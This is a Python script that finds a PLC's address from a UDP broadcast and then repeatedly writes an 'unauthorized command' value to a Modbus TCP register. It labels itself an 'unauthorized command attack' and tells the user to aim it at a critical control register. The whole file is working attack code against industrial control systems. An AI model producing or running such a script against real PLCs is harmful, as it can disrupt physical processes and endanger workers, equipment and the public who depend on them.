import socket
import struct
import time
import sys

# --- Configuration ---
PLC_IP = None  # Initially unknown, will be discovered
PLC_PORT = 502  # Standard Modbus TCP port. Adjust if different.
TARGET_REGISTER = 40001  # Example: Register to write to.  Adjust to a critical control register on your PLC.
UNAUTHORIZED_COMMAND_VALUE = 10  # Example: A value that triggers unexpected behavior. Adjust.  This is the "unauthorized command"
SLEEP_TIME = 2  # Time to wait between write attempts (seconds)
REGISTER_SIZE = 2  # Size of the Modbus register in bytes (usually 2 for a 16-bit register)

def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address by listening for broadcast messages.
    This is a rudimentary example and might not work in all network configurations.
    Consider using a more robust discovery method if this fails.
    """
    UDP_IP = "0.0.0.0"  # Listen on all interfaces
    UDP_PORT = 5000  # Arbitrary port, needs to match PLC broadcast configuration

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((UDP_IP, UDP_PORT))
    sock.settimeout(5)  # Timeout after 5 seconds

    print("Attempting to discover PLC IP via UDP broadcast...")

    try:
        data, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
        print(f"Received message: {data.decode()} from {addr[0]}")  #Decode message
        sock.close() #Close connection

        # Assuming the PLC includes its IP address in the broadcast message,
        # try to extract it.  Adjust the parsing logic based on the PLC's actual broadcast message format.
        if "PLC_IP:" in data.decode():
          PLC_IP_discovered = data.decode().split("PLC_IP:")[1].strip()
          return PLC_IP_discovered
        else:
          print("PLC IP not found in broadcast message, using fallback IP. Please verify the PLC is broadcasting.")
          return None #Return none if the IP address could not be found in the broadcast message

    except socket.timeout:
        print("No broadcast message received within timeout.  Ensure the PLC is configured to send UDP broadcast messages.")
        sock.close()
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        sock.close()
        return None

def modbus_write_single_register(ip, port, register, value):
    """
    Writes a single register value to the PLC using Modbus TCP.
    """
    try:
        # 1. Build the Modbus TCP ADU (Application Data Unit)
        transaction_identifier = 0  # Can be any unique value for each transaction
        protocol_identifier = 0  # Always 0 for Modbus TCP
        length = 6  # Length of the remaining fields (unit identifier + function code + address + value)
        unit_identifier = 1  # Slave address (usually 1 for PLCs)

        # Function code 0x06: Write Single Register
        function_code = 6

        # Data to write (register address and value)
        register_address = register - 1  # Modbus addresses are 1-based, but often internally 0-based
        register_value = value

        # Pack the data into a byte string
        pdu = struct.pack(">BHH", function_code, register_address, register_value) #PDU = protocol data unit
        adu = struct.pack(">HHH", transaction_identifier, protocol_identifier, length) + bytes([unit_identifier]) + pdu
        
        # 2. Create a socket and connect to the PLC
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5) #Timeout for connection attempts
        sock.connect((ip, port))

        # 3. Send the Modbus request
        sock.sendall(adu)

        # 4. Receive the response (optional, but good for error checking)
        response = sock.recv(1024)

        # 5. Close the connection
        sock.close()

        print(f"Successfully wrote value {value} to register {register} at {ip}:{port}")
        # You could add more detailed response parsing here to verify the write was successful.
        return True

    except socket.timeout:
        print(f"Timeout error: Could not connect to {ip}:{port}")
        return False
    except ConnectionRefusedError:
        print(f"Connection refused: PLC at {ip}:{port} may not be listening or is blocking the connection.")
        return False
    except Exception as e:
        print(f"Error writing to PLC: {e}")
        return False


if __name__ == "__main__":

    # Discover PLC IP if not provided
    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            print("Failed to discover PLC IP.  Exiting.")
            sys.exit(1) # Exit the script if we cannot determine the IP
        else:
            print(f"PLC IP Address discovered: {PLC_IP}")

    # --- Main Loop ---
    print(f"Starting unauthorized command attack on PLC at {PLC_IP}:{PLC_PORT}, register {TARGET_REGISTER}")
    try:
        while True:
            # Send the unauthorized command
            if modbus_write_single_register(PLC_IP, PLC_PORT, TARGET_REGISTER, UNAUTHORIZED_COMMAND_VALUE):
                print(f"Sent unauthorized command value {UNAUTHORIZED_COMMAND_VALUE} to register {TARGET_REGISTER}")
            else:
                print("Failed to send unauthorized command.")

            time.sleep(SLEEP_TIME)

    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")